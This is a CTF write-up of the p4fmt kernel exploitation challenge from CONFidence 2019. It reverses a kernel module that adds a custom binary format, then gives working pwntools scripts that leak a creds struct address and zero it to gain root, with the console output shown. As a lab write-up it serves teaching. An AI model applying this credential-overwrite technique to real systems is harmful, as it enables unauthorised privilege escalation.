---
title: p4fmt - CONFidence CTF 2019 Teaser
date: '2019-03-19 21:20:12'
layout: post
---

> Kernel challs are always a bit painful. No internet access, no SSH, no file copying.
> You're stuck with copy pasting base64'd (sometimes static) ELFs. But what if there was another solution?
> We've created a lightweight, simple binary format for your pwning pleasure. It's time to prove your skills.
>
> [p4fmt.tar.gz 4.3 MB](https://confidence2019-storage.ams3.cdn.digitaloceanspaces.com/challenges/p4fmt_e449a9fc5d3687f5ba91b669db78cfd5f187e5ac32a5ac3cdde32f882dcc5e13.tar.gz)
>
> nc p4fmt.zajebistyc.tf 30002
>

*304 Pts, 10 solves, pwn*

After downloading and extracting the archive, we have a fairly standard qemu setup with an initramfs, bzImage, and run script. Extracting the initramfs gives us the filesystem where we can see a fake flag as well as a kernel module `p4fmt.ko`. The challenge description tells use that p4 have created a new binary format, so this must be the module that adds it.

Opening the module up in Ghirda did not work very well, it had real trobule with the symbol relocation. Unchecking "Perform Symbol Relocations" when loading the module was slightly better, but then there were no symbols unless you opened up the "Relocation Table" window.

![Ghirda Relocation View](/assets/conf19/reloc.jpg)

I found that if I relinked the module into a standard ELF with gcc then Ghidra opened and analysed it correctly.

```bash
gcc p4fmt.ko -o p4fmt.bin -Wl,--unresolved-symbols=ignore-in-object-files
```
<br>

The next stage was to modify `/init` to login as root, as well as changing the run script by adding `nokaslr` to the append flag, and add `-s` so we can connect with gdb. Repacking the initramfs2.cpio.gz was can be done with the following:

```bash
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs2.cpio.gz
```

Once we launch qemu, we can get the location of the module from `/proc/modules`, connect with gdb and add the module symbols (using [extract-vmlinux](https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux) to convert the bzImage to vmlinux):

```bash
# cat /proc/modules
p4fmt 16384 0 - Live 0xffffffffc0000000 (O)

gdb ./vmlinux
gdb$ target remote :1234
gdb$ add-symbol-file ./initramfs/p4fmt.ko 0xffffffffc0000000
```

<br>

We now can debug the running kernel module and have Ghirda working, time to start the analysis. 

![Ghirda Relocation View](/assets/conf19/init.jpg)

The module calls `__register_binfmt` to register a new handler, and `p4format` contains a pointer to the function `load_p4_binary(linux_binprm *bprm)`. Looking at this function we can see that it looks at the beginning of the file to see if it starts with `P4\x00`, then branches depending on if the next byte is 0 or 1. Creating a basic struct for this in Ghidra gives us the following:

```c
enum p4_type {
    SIMPLE=0,
    ADVANCED=1
};

struct p4_bin {
    char magic[2];
    char version;
    enum p4_type type;
};
```

![Ghirda Relocation View](/assets/conf19/format.jpg)

In the simple case, the next 4 bytes are ignored and the following 8 bytes are used as the address for `vm_mmap` as well as the entry point.

In the advanced case, the next 4 bytes is the count of regions to be mapped, and the following 8 bytes are used as an offset from `buf` to the location of the mapping info. The mapping info is just three longs: `load_addr`, `length`, and `offset`. The last nibble `load_addr` is also used to determine the mapping protection as well as whether the region is cleared or not. Finally the entry point is set to the `load_addr` of the first mapping. Expanding our structures gives us the following:

```c
struct p4_mapping {
    long load_addr;
    long length;
    long offset;
};

struct p4_bin {
    char magic[2];
    char version;
    enum p4_type type;
    int mapping_count;
    long offset;
};
```

![Ghirda Relocation View](/assets/conf19/mappings.jpg)

Here we can see the first couple of bugs, firstly there is no check on the result of `vm_mmap` before calling `__clear_user`, allowing us to zero out any kernel memory. There is also no check on the mapping offset or count to ensure it stays within the file.

To test that everything is working as we thing it should, we can write a quick python script to create a p4 binary:

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"

code = asm( shellcraft.echo("Hello World!\n") + shellcraft.exit())

payload = ""
payload += "P4"              # magic
payload += p8(0)             # version
payload += p8(1)             # type

payload += p32(2)            # count
payload += p64(0x10)         # offset

payload += p64(0x400040)     # entry
payload += p64(0)
payload += p64(0)

payload += p64(0x400000 | 7) # mapping
payload += p64(0x1000)
payload += p64(0)

payload += code

print "rm a; printf '" + payload.encode("string_escape") + "'>a;chmod +x a; ./a"
```

And then when run we can see that it was successful and `Hello World!` is printed!

```bash
 $ rm a; printf 'P4\x00\x01\x02\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00@\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8sme \x0b\x01\x01\x01H1\x04$H\xb8Hello WoPj\x01Xj\x01_j\rZH\x89\xe6\x0f\x051\xffj<X\x0f\x05'>a;chmod +x a; ./a
[ 1373.826312] vm_mmap(load_addr=0x400000, length=0x0, offset=0x0, prot=0)
[ 1373.827737] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)
Hello World!
```

Using the unchecked mapping count, we can use our script above and set the count to 6 to get it to print out the address of `cred` from the `linux_binprm` struct (`0x3e8` is our uid, you can also follow `install_exec_creds` to find the offset of creds in linux_binprm).

```bash
$ ./a
[ 1985.638974] vm_mmap(load_addr=0x400000, length=0x0, offset=0x0, prot=0)
[ 1985.639654] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)
[ 1985.641174] vm_mmap(load_addr=0x10101010101b000, length=0x656d73b848500101, offset=0x431480101010b20, prot=0)
[ 1985.642006] clear_user(addr=0x10101010101b848, length=0x656d73b848500101)
[ 1985.642936] vm_mmap(load_addr=0x6f6c6c6548b84000, length=0x6a58016a506f5720, offset=0xe689485a0d6a5f01, prot=4)
[ 1985.644299] vm_mmap(load_addr=0xf583c6aff310000, length=0x5, offset=0x7fffffffefb2, prot=7)
[ 1985.645457] clear_user(addr=0xf583c6aff31050f, length=0x5)
[ 1985.645950] vm_mmap(load_addr=0x100000000, length=0x0, offset=0xffff888007597480, prot=1)
Hello World!

gdb$ telescope 0xffff888007597480
0000| 0xffff888007597480 --> 0xffff888007597c00 --> 0xffff888007597780
0008| 0xffff888007597488 --> 0xffff8880076cd450 --> 0x100000002
0016| 0xffff888007597490 --> 0x0
0024| 0xffff888007597498 --> 0x3e8
0032| 0xffff8880075974a0 --> 0x0
0040| 0xffff8880075974a8 --> 0x0
0048| 0xffff8880075974b0 --> 0xffffffff000003e8
0056| 0xffff8880075974b8 --> 0x3e80000003f

```

Also, if we run it a bunch if times then we see that the same address gets reused after a while. Knowing this, we should be able to leak the address of creds struct, setup a mapping to overwrite the ids with 0, then read the flag:

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"

code = asm(shellcraft.cat("/flag") + shellcraft.exit())

creds = 0xffff93a1875f80c0 # leaked creds struct
payload = ""
payload += "P4"          # magic
payload += p8(0)         # version
payload += p8(1)         # type

payload += p32(3)        # count
payload += p64(0x10)     # offset

payload += p64(0x400058) # entry
payload += p64(0)
payload += p64(0)

payload += p64(0x400000 | 7) # prot
payload += p64(0x1000)
payload += p64(0)

payload += p64((creds + 0x10) | 8) # clear
payload += p64(0x20)
payload += p64(0)

payload += code

print "rm b; printf '" + payload.encode("string_escape") + "'>b;chmod +x ./b; ./b"
```

After running this a couple of times we get root!

```
 $ ./b
[   42.996356] vm_mmap(load_addr=0x400000, length=0x0, offset=0x0, prot=0)
[   42.996716] clear_user(addr=0x400058, length=0x0)
[   42.996997] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)
[   42.997590] vm_mmap(load_addr=0xffff93a1875f8000, length=0x20, offset=0x0, prot=0)
[   42.998968] clear_user(addr=0xffff93a1875f80d8, length=0x20)
/tmp $ ./b
[   44.806650] vm_mmap(load_addr=0x400000, length=0x0, offset=0x0, prot=0)
[   44.808393] clear_user(addr=0x400058, length=0x0)
[   44.809390] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)
[   44.810611] vm_mmap(load_addr=0xffff93a1875f8000, length=0x20, offset=0x0, prot=0)
[   44.811946] clear_user(addr=0xffff93a1875f80d8, length=0x20)
<FLAG WILL BE HERE>
```

Repeating the same steps on the remote gives us the flag (and first blood!):

`p4{4r3_y0U_4_81n4ry_N1njA?}`
